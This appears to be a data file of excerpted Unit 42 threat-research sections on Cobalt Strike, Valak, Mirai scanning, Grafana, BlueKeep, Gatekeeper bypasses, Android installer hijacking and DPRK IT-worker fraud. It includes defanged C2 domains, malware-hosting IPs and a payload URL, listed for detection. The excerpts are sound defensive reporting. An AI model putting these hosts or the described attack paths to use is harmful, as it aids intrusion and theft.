a62869157dfe3\ne8a454cd8b57a243f0abeec6945c9b10616cfdcc4abfb4c618bfc469d026d537\neac776c3c83c9db1a770ffaf6df9e94611c8293cbd41cb9257148603b8f2be0b\nead0f3e6f0ca16b283f09526d09e8e8cba687dab642f0e102e5487cb565bf475\nf011a136996fa53fdbde944da0908da446b9532307a35c44ed08241b5e602cc9\nf2a2f4fa2ed5b2a94720a4661937da97ab21aa198a5f8c83bb6895aa2c398d22\nf62f21ee7e642f272b881827b45ceb643c999a742e1d3eac13d1ba014d1e7f67\nf9f0973dc74716b75291f5a9b2d59b08500882563011d1def2b8d0b1b9bbb8ae\nC2:\ntheme[[.]]blogsite[.]org\ncortana[.]homelinux[.]com\nword[.]webhop[.]info\nwork[.]windownoffice[.]com\ncortanasyn[.]com\ne[.]browsersyn[.]com\nsyn[.]servebbs[.]com\nservice[.]windown-update[.]com\ncheck[.]homeip[.]net\noutlook[.]updateoffices[.]net\nmail[.]fptservice[.]net\noffice[.]windown-update[.]com\ncortanazone[.]com\nbeta[.]officopedia[.]com\nvideos[.]dyndns[.]org\nservice[.]serveftp[.]org\nsyn[.]browserstime[.]com\ncheck[.]webhop[.]org\nristineho[.]com", "source": "Palo"}, {"title": "Appendix", "content": "Cobalt Strike Beacon contains the hard-coded configuration data in its body. JPCERT published an article about the structure of the configuration. The sample we obtained has the following configuration (Figure 10) and connects to the C2 server, https:// b.cortanazone[.]com.\nFigure10:Cobalt Strike Beacon configuration", "source": "Palo"}, {"title": "Appendix", "content": "Figure 11 shows some of the contents of the individual RAR files. All the .exe files are copies of Windows Word and the associated 'wwlib.dll' file is the malicious downloader DLL KerrDown, which is sideloaded when the .exe file gets executed.\nFigure11:RAR archives with malicious DLL for sideloading", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have discovered a newBroken Object Level Authorization(BOLA) vulnerability that impactsGrafanaversionsfrom 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5. Grafana is a popular open-source data observability and visualization platform with over 20 million users worldwide and almost60,000stars on GitHub.\nThis vulnerability, assigned asCVE-2024-1313with aCVSS score of 6.5, allows low-privileged Grafana users to delete dashboard snapshots belonging to other organizations using the snapshot's keys, impacting the integrity of the system. Exploiting this vulnerability is relatively straightforward as it only requires knowledge of the snapshot's key, which is not considered a secret and is shown in several endpoints' query parameters.\nIn addition to this BOLA vulnerability, Unit 42 researchers also found an endpoint that allows any Grafana user to create snapshot images and does not enforce complexity checks on the self-assigned secret keys. While these are not deemed vulnerabilities by Grafana, attackers can potentially exploit them to launch denial-of-service attacks or brute-force the weak secrets to view or delete snapshots belonging to other users.\nAll the security concerns discussed in this article arise from thedashboard snapshot APIs, a popular feature commonly used for sharing, displaying and backing up data. A low-privileged user with malicious intent could exploit these issues to access sensitive data or compromise data integrity.\nThis article offers a comprehensive analysis of the BOLA vulnerability and the attack vectors within Grafana, including technical specifics, preconditions and potential impacts. The post also provides practical advice on solutions and mitigations, underscoring the importance of proactive security measures.\nPrisma Cloudcustomers usingWeb-Application and API Security (WAAS)are better protected from these threats using a newcustom rule.\nCustomers are also better protected through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced URL Filtering.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "BOLA is a type of vulnerability that many people often overlook, despite its potentially high impact. Even mature applications undergoing rigorous security audits can reveal a BOLA that seems obvious once uncovered. The absence of automated testing tools is the primary reason organizations continue to grapple with BOLA vulnerabilities.\nResearchers at Unit 42 are committed to fortifying open-source software and innovating technology to discover new vulnerabilities more efficiently and effectively. Palo Alto Networks customers are safeguarded by our latest research findings and insights.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "AWS Lambda was released in 2014 and introduced a new cloud execution model \u2013serverless computing, which is now widely adopted. Since then, numerous companies began offering security solutions for AWS Lambda and serverless computing in general. These security platforms commonly provide:\nVulnerability Scanning \u2013 Ensuring that your code doesn't contain any known vulnerabilities ('one-days'). \nRuntime Protection \u2013 Preventing exploitation of zero-day vulnerabilities in production.\nBut what can an attacker even do if he found a Remote Code Execution (RCE) vulnerability in a Lambda function?In other words, if there's a security flaw in the user's handler or in one of the modules used by it, what can an attacker achieve upon exploiting such vulnerability?\nLet's examine a common use case \u2013 a Lambda that processes and validates some data, and then enters it into a database.\nSome straightforward answers come to mind:\nThe attacker can abuse our vulnerable Lambda as anexecution resource, and leverage it for crypto-mining, for example. \nThe attacker has access to the resources available to the Lambda. Our Lambda has write privileges to a certain DB, and so the attacker has them too.\nThese are legitimate attack vectors, but in the example above it's likely that the attacker will be most interested in the users' private information. Luckily for the users, our Lambda is appropriately configured with only writing privileges to the sensitive DB.\nWell, what about the other invocations? They contain new information designated for the DB, can the attacker access them somehow?That is the question I sought to answer in a research I conducted. The short answer isyes, an attacker can persist on a vulnerable Lambda instance and gain access to other invocations. Let's see how.", "source": "Palo"}, {"title": "Introduction", "content": "First noted in late 2019, Valak is an information stealer and malware loader that has become increasingly common in our threat landscape. From April through June of 2020, we saw waves of Valak malware two to four times a week on average through an email distribution network nicknamed Shathak or TA551. Characteristics of Valak include:\nValak relies onscheduled tasksandWindows registry updatesto remain persistent on an infected Windows host. \nValak usesAlternate Data Stream (ADS)as a technique to run follow-up malware on an infected host. \nRecent Valak infections show an increase in obfuscated code for configuration scripts used during the infection, possibly as an attempt to avoid detection. \nSince April 2020, we have seen a great deal of Valak malware distributed by an actor sometimes referred to as Shathak/TA551.\nThis blog covers the history of Valak, reviews the chain of events for an infection, examines traffic generated by Valak and explores recent updates in obfuscation techniques used by the malware in order to evade detection. This blog also examines the Shathak/TA551 distribution system that has been consistently pushing Valak since April 2020.\nPalo Alto Networks customers are protected from Valak by ourThreat Prevention subscriptionfor the Next-Generation Firewall.", "source": "Palo"}, {"title": "Conclusion", "content": "As we enter the second half of 2020, Valak shows no signs of slowing down. We expect to see further waves of malspam from Shathak/TA551 distribution pushing Word documents with macros for Valak.\nDue to its complex infection process that relies in part on registry updates with malware code, Valak can easily infect an unprotected Windows host. With ADS used to hide follow-up malware from a Valak infection, the risk is greatly increased.\nHowever, security best practices like running fully patched and up-to-date versions of Microsoft Windows will hinder or prevent Valak infections. Palo Alto Networks customers are further protected from Valak by our Threat Prevention subscription for the Next-Generation Firewall.AutoFocususers can search for Valak activity by using theValaktag.\nAppendix A\nExamples of SHA256 file hashes along with the associated file names for Word documents from Shathak/TA551 distribution during June 2020. Information available at:https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-June-SHA256-hashes-of-Word-docs-from-Shathak-TA551-distribution.txt\nAppendix B\nExamples of URLs generated by Word documents associated with Shathak/TA551. Information available at:https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-03-23-to-2020-07-07-TA551-traffic-pattern-history-since-Valak.txt\nAppendix C\nExamples of SHA256 file hashes for Valak DLL files seen from Shathak/TA551 distribution during June 2020. Information available at:https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-June-SHA256-hashes-of-Valak-DLL-files-from-Shathak-TA551-distribution.txt", "source": "Palo"}, {"title": "Introduction", "content": "Our telemetry indicates a growing number of threat actors are turning to malware-initiated scanning attacks. This article reviews how attackers use infected hosts for malware-based scans of their targets instead of the more traditional approach using direct scans.\nThreat actors have been using scanning methods to pinpoint vulnerabilities in networks or systems for a very long time. Some scanning attacks originate from benign networks likely driven by malware on infected machines. By launching scanning attacks from compromised hosts, attackers can accomplish the following:\nCovering their traces \nBypassing geofencing \nExpanding botnets \nLeveraging the resources of these compromised devices to generate a higher volume of scanning requests compared to what they could achieve using only their own devices\nWe identified several prominent characteristics of scanning behavior, such as an unusually high volume of requests. Using these characteristics and the signatures of known threats, we are able to detect known cases as well as emerging new scanning patterns.\nPalo Alto Networks customers receive protection against malicious scanning activity through ourNext-Generation FirewallandPrisma SASEwithCloud-Delivered Security Servicesenabled, includingAdvanced URL Filtering,Advanced Threat Prevention,Advanced WildFireandDNS Security.\nThePrisma Cloud WAASmodule helps protect cloud-native web applications and API endpoints from scanning attacks.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Introduction", "content": "Scanning occurs when an attacker initiates network requests in an attempt to exploit the potential vulnerabilities of the target hosts. The target hosts are typically benign and potentially vulnerable to the CVE targeted by the attacker.\nCommonly seen scanning behaviors include the following:\nPort scanning \nVulnerability scanning \nOS fingerprinting\nIn Figure 1, we depict an attack model of a simple direct incident of attacker scanning. In this model, the attacker makes an HTTP POST request (as described inour MOVEit-related threat brief) to the fictionalrandom-university[.]eduin an attempt to scan for and subsequently exploit the MOVEit vulnerability CVE-2023-34362. Ifrandom-university[.]eduis vulnerable to this CVE and there is no other protection mechanism employed, this attack would succeed.", "source": "Palo"}, {"title": "Conclusion", "content": "Our telemetry indicates a significant number of malware-initiated scans among the scanning attacks we detected in 2023. Malware-initiated scans are a less-direct form of scanning compared to the more straightforward approach traditionally seen with attacker scans.\nOur data also reveals other trends in scanning related to various vulnerabilities that appeared in 2023. These findings indicate that commonly targeted vulnerabilities are those with a higher probability of affecting a wide range of targets.\nThis data underscores the importance of proactive monitoring and defense mechanisms against scanning.\nPalo Alto Networks customers benefit from ourNext-Generation FirewallandPrisma SASEwithCloud-Delivered Security Services, includingAdvanced URL (AURL) Filtering,Advanced Threat Prevention,Advanced WildFire,DNS Security.\nIn particular,(AURL) Filteringoffers robust protection against the evolving landscape of scanning attacks. Specifically, our AURL customers can block the scanning behavior described by simply blocking the Scanning Activity category.\nAlso, thePrisma Cloud WAASmodule helps protect cloud-native web applications and API endpoints from scanning attacks.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "IP addresses/URLs/SHAs that have hosted Mirai malware\n45.66.230[.]32 \n85.208.139[.]73 \n87.120.88[.]13 \n95.214.27[.]244 \n103.110.33[.]164 \n103.95.196[.]149 \n103.131.57[.]59/mips \n103.212.81[.]116 \n103.228.126[.]17 \n145.40.126[.]81/mips \n146.19.191[.]85 \n146.19.191[.]108 \n176.97.210[.]211/mips \n185.112.83[.]15 \n193.31.28[.]13 \n193.47.61[.]75 \n217.114.43[.]149 \n23190d722ba3fe97d859bd9b086ff33a14ae9aecfc8a2c3427623f93de3d3b14\nDomain and URL associated with Ivanti vulnerability scans\ndnslog[.]store \nhxxp://45.130.22[.]219/ivanti.js \n137.220.130[.]2/doc", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers discuss a machine learning pipeline we've built around memory-based artifacts from our hypervisor-based sandbox, which is part of Advanced WildFire. This alternative approach is one we've come up with to boost detection accuracy against malware using a variety of different evasion techniques.\nAs we discussed inour first two postsin this series, malware authors are routinely refining their shenanigans to make strategies like static analysis and sandboxing ineffective. The continual development and permutation of techniques like packing methodologies and sandbox evasions create a continual cat and mouse game that is difficult to stay on top of for any detection team.\nTo make matters worse, popular detection techniques such as structural analysis, static signatures and many types of dynamic analysis do not fare well against the ever-increasing complexity we encounter in the more prevalent malware families.", "source": "Palo"}, {"title": "Conclusion", "content": "The GuLoader family is an excellent example of malware to detect with our machine learning model, because its use of sandbox evasions and static armoring makes it hard for traditional defenses to detect using structural cues and execution logs alone.\nWith Advanced WildFire, we introduce a hypervisor-based sandbox that can stealthily observe the memory of GuLoader during execution to parse meaningful memory resident artifacts and information useful for our machine learning detection pipeline. This allows us to accurately detect the malicious behavior using features extracted from the observed memory-based artifacts.\nPalo Alto Networks customers receive protections from threats such as those discussed in this post withAdvanced WildFire.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have found that certain third-party utilities and applications pertaining to archiving, virtualization and Apple's native command-line tools do not enforce the quarantine attribute. This can pose a threat to the integrity of a security feature on macOS known as Gatekeeper, which is responsible for ensuring that only trusted software runs on the system. A bypass of Gatekeeper could leave the user unprotected from risky applications that may attempt to execute malicious content.\nOne of the key components of the Gatekeeper security feature on macOS is a metadata attribute that the browser adds to downloaded files, which triggers Gatekeeper to validate the application. Apple assumes that developers will comply with their security guidelines regarding the inheritance of extended attributes, to ensure that this scanning mechanism can properly function. Because this is not necessarily the case, this can pose a weakness in the Gatekeeper mechanism.\nWe urge all third-party developers to comply with Gatekeeper's security requirements by enforcing the attribute on all files their applications handle. This will help to reduce the risk of malicious Gatekeeper bypasses.\nGatekeeper is an essential security mechanism on macOS; ideally its integrity will not rely on the goodwill of developers but on Apple's enforcement of the quarantine attribute propagation where relevant. While Apple expects third-party application developers to keep a certain standard, some built-in utilities do not comply with this standard. Should Apple choose to do so, addressing this issue could be a positive step toward making the system more secure.\nPalo Alto Networks customers are protected from malicious content from third-party applications throughCortex XDRandXSIAM.", "source": "Palo"}, {"title": "Conclusion", "content": "Gatekeeper is an important security mechanism that draws the attention of both security researchers and attackers. This mechanism makes it more difficult for attackers to execute malicious content from risky applications. However, Gatekeeper's design relies heavily on the implementation of third-party developers to comply with its security standards.\nIn addition, Apple does not enforce the quarantine extended attribute on its own native command-line tools. The mechanism's failure in scanning files in such cases creates weaknesses, which might pose a risk for users. Organizations should take extra caution while using these tools.\nAs described, the Gatekeeper mechanism faces many potential bypass possibilities. One of the best protections for an organization against a potential attack using a Gatekeeper bypass is to use a multi-layer protection approach.\nCortex XDRandXSIAMare designed to prevent the execution of known malware, and also prevent the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module.", "source": "Palo"}, {"title": "Introduction", "content": "In May 2019, Microsoft released an out-of-band patch update for remote code execution vulnerabilityCVE-2019-0708, which is also known as \"BlueKeep\" and resides in code to Remote Desktop Services (RDS). This vulnerability is pre-authentication and requires no user interaction, making it particularly dangerous as it has the unsettling potential to be weaponized into a destructive exploit. If successfully exploited, this vulnerability could execute arbitrary code with \"system\" privileges. The Microsoft Security Response Centeradvisoryindicates this vulnerability may also be wormable, a behavior seen in attacks including Wannacry and EsteemAudit. Understanding the seriousness of this vulnerability and its potential impact to the public, Microsoft took the rare step of releasing a patch for the no longer supported Windows XP operating system, in a bid to protect Windows users.\nWith potential global catastrophic ramifications, Unit 42 researchers felt it was important to analyze this vulnerability to understand the inner workings of RDS and how it could be exploited. Our research dives deep into the RDP internals and how they can be leveraged to gain code execution on an unpatched host. This blog discusses how Bitmap Cache protocol data unit (PDU), Refresh Rect PDU, and RDPDR Client Name Request PDU can be used to write data into kernel memory.\nSince the patch was released in May, this vulnerability has received a lot of attention from the Computer Security industry. It is only a matter of time before a working exploit is released in the wild. The findings of our research highlight the risks if vulnerable systems are left unpatched.", "source": "Palo"}, {"title": "Introduction", "content": "In March 2013, the country of South Korea experienced a major cyberattack, affecting tens of thousands of computer systems in the financial and broadcasting industries. This attack was dubbed 'Dark Seoul'; it involved wreaking havoc on affected systems by wiping their hard drives, in addition to seeking military intelligence.\nThe attack was initially thought to be attributed to North Korea, by way of a Chinese IP found during the attack, but no other strong evidence of North Korea's involvement has been produced since then. In June 2013, McAfee published a report detailing the chronology and variance of the Dark Seoul campaign, but renamed it 'Operation Troy'. The report analyzed the entirety of the purported attack campaign, beginning in 2009 using a family of tools dubbed 'Troy'. McAfee further attributed two groups to the campaign: the NewRomanic Cyber Army Team and The Whois Hacking Team; both groups believed to be state sponsored. Since the publication of that report, no other activity involving either group or the tools have been detected or shared publically.\nThat is, until now.", "source": "Palo"}, {"title": "Conclusion", "content": "It is not uncommon for threat actors to become dormant for some period of time, especially after public unveiling as the groups behind Dark Seoul/Operation Troy experienced. What we do know is that changing infrastructure and toolsets can be challenging, and it is not nearly as common that a very specialized tool developed for specific teams would be shared amongst threat actors.\nThere is insufficient data at this time to clearly state why Dark Seoul/Operation Troy would resurface at this time, but Unit 42 will continue to monitor the activity as the situation develops.\nWe have created the AutoFocus tagTDrop2to identify samples of this new variant and have added known C2 domains and hash values to the Threat Prevention product set. At this time, WildFire is able to correctly identify the samples associated with this campaign as malicious.", "source": "Palo"}, {"title": "IOC", "content": "SHA256 Hashes\n52939b9ec4bc451172fa1c5810185194af7f5f6fa09c3c20b242229f56162b0f1dee9b9d2e390f217cf19e63cdc3e53cc5d590eb2b9b21599e2da23a7a63618452d465e368d2cb7dbf7d478ebadb367b3daa073e15d86f0cbd1a6265abfbd2fba02e1cb1efbe8f3551cc3a4b452c2b7f93565860cde44d26496aabd0d329644443eb1b6bf1707e55a39e87985eda455fb322afae3d2a57339c5e29054fb52042\nDomains\nwww.junfac[.]comwww.htomega[.]commcm-yachtmanagement[.]comwww.combra[.]eu\nURLs\nwww.junfac[.]com/tires/skin/tires.phpwww.htomega[.]com/rgboard/image/rgboard.gifmcm-yachtmanagement[.]com/installx/install_ok.phpwww.combra[.]eu/includes/images/logo.jpg", "source": "Palo"}, {"title": "Introduction", "content": "We recently discovered two zero-day vulnerabilities in Adobe Reader. Adobe has sincereleased a patch(on October 6, 2016) to fix these vulnerabilities, which are named CVE-2016-6957 and CVE-2016-6958. These vulnerabilities could allow an attacker to compromise Adobe Reader by bypassing restrictions on JavaScript API execution (CVE-2016-6957) and security provisions that prevent arbitrary execution of scripts such as those written in Python (CVE-2016-6957). In this blog post, I will provide a technical walkthrough of these vulnerabilities, how they can be exploited, and how Palo Alto Networks customers are protected.", "source": "Palo"}, {"title": "Conclusion", "content": "The JavaScript engine that Adobe implements contains functions that can introduce potential security vulnerabilities. In order to enforce security measures for the JavaScript API, they introduced features such as secured and trusted functions. But it is possible to abuse the nature of the JavaScript language to cause some unexpected behaviors when combined with those security features. Their efforts to mitigate such issues are thorough, but there still appear to be viable exploitation pathways. We thank Adobe for their quick attention to the issues described in this post, and for therelease of the October 6 patch.\nPalo Alto Networks customers who deploy ourNext-Generation Security Platformare protected from zero-day vulnerabilities such as these. Threat Prevention (an essential service for our next-generation firewalls that includes capabilities such asapplication control,IPS,anti-malware, andcommand and control protection),WildFire, andURL Filteringservices provide our customers with comprehensive protection and automatic updates against previously unknown threats within as little as 5 minutes.", "source": "Palo"}, {"title": "Introduction", "content": "Workers with allegiances to the Democratic People's Republic of Korea (DPRK) have been infiltrating organizations worldwide through a fraudulent remote work scheme. This operation not only violates international sanctions but also poses cybersecurity risks to unwitting employers.\nDrawing on publicly available information, including recent U.S. Department of Justice reports, Unit 42 has developed a guide for network defenders. While no single technique alone will detect these operatives, we propose a multi-faceted strategy that combines enhanced IT asset management, contextual analysis and strengthened security awareness.\nKey to our recommendations is the implementation of a risk matrix tailored to each organization's specific environment. This matrix helps identify red flags, including the use of stolen identities, unusual work patterns and suspicious shipping addresses. We also stress the importance of rigorous background checks and the need for organizations to share information about suspicious activities.\nWith these strategies, organizations can strengthen their ability to detect and mitigate the risks posed by DPRK IT workers. While the threat is evolving, a proactive, informed approach can go a long way in preventing the exfiltration of sensitive data and inadvertent funding of North Korea's ambitions.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourNetwork Securityplatform,Prisma Access Browserofferings andCortexline of products.\nOrganizations can engage theUnit 42 Incident Response teamfor specific assistance with this threat and others.", "source": "Palo"}, {"title": "Introduction", "content": "A scheme orchestrated by the DPRK has been infiltrating companies worldwide, posing significant cybersecurity risks and violating international sanctions. DPRK IT workers, operating under the direction of their government, are securing remote positions with businesses across the globe.\nThese operatives pose aslegitimate freelancers or applicants from various countries, generating substantial revenue thatdirectly funds North Korea's weapons of mass destruction (WMD) programs. According to U.S. Department of Justice reports, individual IT workers can earn up to $300,000 annually. The North Korean government retains up to 90% of these earnings, which collectively totals hundreds of millions of dollars each year.\nThe tactics, techniques and procedures (TTPs) employed by these operatives include the following:\nUsing stolen or synthetic identities \nUsing falsified employment and identity documents \nWorking with U.S.-based accomplices to create the appearance of domestic work locations \nUsing virtual private networks (VPNs) to mask true geographic locations \nManipulating employment verification processes \nExtorting employers [PDF]by threatening to publish sensitive information\nThis operation puts global companies at risk ofdata breaches, intellectual property theftand legal consequences. The scheme takes advantage of the heightened prevalence of remote work and the challenges in verifying digital identities.\nTraditional insider threat programs are unlikely to fully address this state-sponsored activity. Organizations need an approach that combines identity verification, remote work security and insider risk management.\nIn this analysis, Unit 42 will provide:\nAn examination of DPRK IT workers' TTPs \nStrategies for enhancing identity verification processes \nDetection methodologies for identifying anomalous behavior in remote work setups \nGuidance on improving organizational resilience against social engineering \nPractical solutions for strengthening defenses against this threat\nOur objective is to equip cybersecurity professionals and organizations with detection and defensive strategies.", "source": "Palo"}, {"title": "Background", "content": "We recommend organizations engage specialized firms that offer identity document verification services to mitigate the risks associated with manipulated identification documents. These firms are equipped with tools and expertise to detect inconsistencies and signs of tampering in documents that might not be evident to untrained personnel. Unit 42, working withVcheck Global, has created a workflow specifically designed to combat worker identity fraud. Unit 42 can facilitate an introduction to interested parties. Identity verification is the single best opportunity for network defenders when tackling this threat before network intrusion.\nAdditionally, we recommend correlating worker IDs with liveness checks by their hiring manager, who can compare the ID provided during the background check with the individual on camera, as well as during the interview process.\nSome organizations rely on staffing firms to manage identity verification and background checks, relying on a statement of completion from the providers. Organizations should not assume that a staffing firm's attestation guarantees identity verification. Independent verification or strict oversight of the staffing firm's procedures mitigates the risk of infiltration by malicious actors. This could include:\nRequiring that staffing agencies use a defined background check workflow \nEnsuring access to verification documents for audits \nWorking with trusted agencies that prioritize due diligence and background investigations", "source": "Palo"}, {"title": "Conclusion", "content": "The threat posed by DPRK IT workers represents a challenge for organizations. These state-sponsored actors have demonstrated adaptability and resourcefulness in their efforts to infiltrate companies, generate revenue for North Korea's weapons programs, and potentially exfiltrate sensitive information.\nOur analysis reveals a sophisticated operation that exploits the architecture of human resources operations. The operation leverages a combination of identity fraud, technological tools and social engineering to compromise organizations.\nWhile no single measure can guarantee protection against this threat, a layered defense strategy significantly improves an organization's ability to detect and mitigate against DPRK IT workers and a variety of similar threats. Regular audits, continuous monitoring and staying informed about evolving TTPs will help in maintaining an effective security posture.\nAs DPRK IT workers continue to refine their methods, the global cybersecurity community must remain vigilant and adaptive. By implementing the strategies outlined in this analysis and fostering collaboration between private sector entities and law enforcement agencies, we can work toward disrupting this revenue stream and protecting sensitive assets.\nPalo Alto Networks customers can better protect against the threats discussed above through the following products:\nCortex XDRcan be configured to block and hunt for the tool sets discussed in this article. \nOrganizations can leverage next-generation firewalls to identify and block access vectors for DPRK IT workers. In environments with outbound SSL decryption enabled, more granular App-ID based policies can be implemented. \nPrisma Access Browsercan be configured to block logins from devices with active remote access sessions, preventing access to sensitive browser-based data in managed or unmanaged environments.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "We discovered a widespread vulnerability in Google's Android OS we are calling \"Android Installer Hijacking,\" estimated to impact 49.5 percent of all current Android users. In detail:\nAndroid Installer Hijacking allows an attacker to modify or replace a seemingly benign Android app with malware, without user knowledge. This only affects applications downloaded from third-party app stores. \nThe malicious application can gain full access to a compromised device, including usernames, passwords, and sensitive data. \nPalo Alto Networks worked with Google and major manufacturers such as Samsung and Amazon to inform them of the vulnerability and issue patches for their devices.", "source": "Palo"}, {"title": "Introduction", "content": "In January 2014, we uncovered aTime-of-Check to Time-of-Use(TOCTTOU) vulnerabilityin Android OS that permits an attacker to hijack the ordinary Android APK installation process. This hijacking technique can be used to bypass the user view and distribute malware with arbitrary permissions. It can substitute one application with another, for instance if a user tries to install a legitimate version of \"Angry Birds\" and ends up with a Flashlight app that's running malware. We are calling the technique that exploits this vulnerability Android Installer Hijacking. We have been cooperating with Google and major manufacturers such as Samsung and Amazon to patch affected Android devices.", "source": "Palo"}, {"title": "Introduction", "content": "Between June and August of this year, we observed a total of 20 unique emails being sent to the following email addresses:\nThese emails contained a series of subject lines, primarily revolving around the topic of \u0417\u0430\u043f\u0430\u0434-2017 ('West-2017'), also known in English asZapad 2017. Zapad 2017 was a series of joint military exercises conducted by the Armed Forces of the Russian Federation and the Republic of Belarus, held from September 14th to 20th in 2017.\nThe full list of subject lines is as follows:\nFwd:\u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430 \u043a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: Fwd:Preparing for the West-2017] \n\u0432\u044b\u043f\u0443\u0441\u043a \u0432\u043e\u0441\u043f\u0438\u0442\u0430\u043d\u043d\u0438\u043a\u043e\u0432 [Translation: graduation] \n\u041a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: To West-2017] \n\u0417\u0430\u043f\u0430\u0434-2017 [Translation: West-2017]\nAn example of some of the previously mentioned emails may be seen below.\nFigure 2 Phishing email sent to Belarus government (1/2)\nFigure 3 Phishing email sent to Belarus government (2/2)", "source": "Palo"}, {"title": "Conclusion", "content": "During the course of this research, we identified a phishing campaign consisting of 20 unique emails targeting the government of Belarus. The ploys used in these email and decoy documents revolved around a joint strategic military exercise of the Armed Forces of the Russian Federation and the Republic of Belarus, which took place between September 14thand September 20thof this year. While looking at the emails in question, we observed two new variants of the CMSTAR malware family. Between the samples identified and others we found while expanding our research scope, we identified two previously unknown malware families.\nPalo Alto customers are protected from this threat in the following ways:\nTags have been created in AutoFocus to trackCMSTAR,BYEBY, andPYLOT \nAll observed samples are identified as malicious in WildFire \nDomains observed to act as C2s have been flagged as malicious \nTraps 4.1 identifies and blocks the CVE-2015-1641 exploit used in these documents \nTraps 4.1 blocks the macros used in the malicious Word documents\nA special thanks to Tom Lancaster for his assistance on this research.", "source": "Palo"}, {"title": "Introduction", "content": "Parts 1,2and3of ourCybercrime Underground the cybercrime seriesdiscussed some of the concepts and definitions around cybercrime, and how cybercriminals collaborate in cybercrime forums in buying and selling malicious tools and services. This latest report in our cybercrime series will provide a glimpse of the darknet markets where cybercriminals buy and sell data which have likely been stolen directly by compromising victim computer systems or by the result of a large database compromise. This blog focuses on explaining what darknet markets are, common payment model used, the type of digital data being bought and sold in the darknet markets and their typical costs. The objective of this blog is not to provide an exhaustive list of all the products and services being sold in the darknet markets but to shed light on how cybercriminals are utilizing the darknet markets to trade with impunity. It is important to understand the impact to the growing number of cybercrime campaigns and how the stolen data is monetized by the cybercriminals due to the demand in specific PII data in the darknet markets.\nMany articles and research published by the information security industry discuss how cyber attacks can be broken down in phases which is widely known as thecyber kill-chain model. Darknet markets also play two important roles in the overall attack kill-chain. First these markets allow cybercriminals to purchase tools which are then utilized in specific stages of the kill-chain. For example: Malware creation and exploit tools which are sold in the darknet markets aid cybercriminals during the 'weaponization' and 'exploitation' phase of the kill-chain model respectively. The last phase of the kill-chain model 'Actions on Objectives', specify the objective or goal of an adversary. Second, darknet markets allow cybercriminals to achieve their goal of making monetary profit by selling the data which may have likely been stolen from victim computer systems. It is also worth noting that not all digital data being sold in the darknet markets are gained from the result of successful cyber attacks. Insider data theft can end up in a darknet market as well. Insiders with the knowledge and know-how on sensitive information can aid in creating fake identification products which look authentic. For example a former Australianpolice officer was arrestedin November 2016, for creating and selling fake police IDs, security and maritime passes in a darknet market.\nThe darknet markets today have increased in numbers as well as the number of users- one of the primary reasons has been the anonymity the darknets provide to the users to perform their illicit and illegal trades as well as the decentralized architecture provided by theTor networkwhich makes it increasingly difficult for law-enforcements to take actions against darknet markets.", "source": "Palo"}, {"title": "Conclusion", "content": "Darknet markets have allowed cybercriminals, fraudsters and criminals who trade in weapons, drugs and illegal products to trade without much concern of getting caught due to the anonymity provided by the deep-web. Though it may be difficult to identify the perpetrators who are managing or using the darknet markets for their profit, global law-enforcement agencies are continuously working to bring the criminals behind the darknet markets to justice and the number of successful cases has been growing where many criminals behind the darknet markets have beenarrested. Large percentage of internet and online service users are often unaware of the threats in the digital world and tend to not follow common online safety measures to secure their personal information or their systems, which eventually result in their personal data being stolen and traded in darknet markets, where the information are further used to commit fraud. It is imperative to have an understanding on how these criminals operate and the type of information being traded to better secure ourselves.\nOrganisations should follow industry standards on securing data and implement security technologies to prevent cyber attacks and reduce the risk of data being stolen and traded in the darknet markets. Palo Alto Networks Next-Generation security platform provides a holistic solution to protect the digital way of life by safely enabling applications and preventing known and unknown threats across the network, cloud and endpoints. For more information on the next-generation security platform visithere.\nReferences:\nhttp://blog.paloaltonetworks.com/2016/08/unit42-exploring-the-cybercrime-underground-part-1-an-introduction/ \nhttps://en.wikipedia.org/wiki/Silk_Road_(marketplace) \nhttps://en.wikipedia.org/wiki/Darknet_market#/media/File:Marketlifetimes.png \nhttps://gitweb.torproject.org/torspec.git/tree/address-spec.txt \nhttps://svn.torproject.org/svn/projects/design-paper/tor-design.pdf \nhttps://en.wikipedia.org/wiki/Credit_score \nhttp://digitalindia.gov.in/content/about-programme 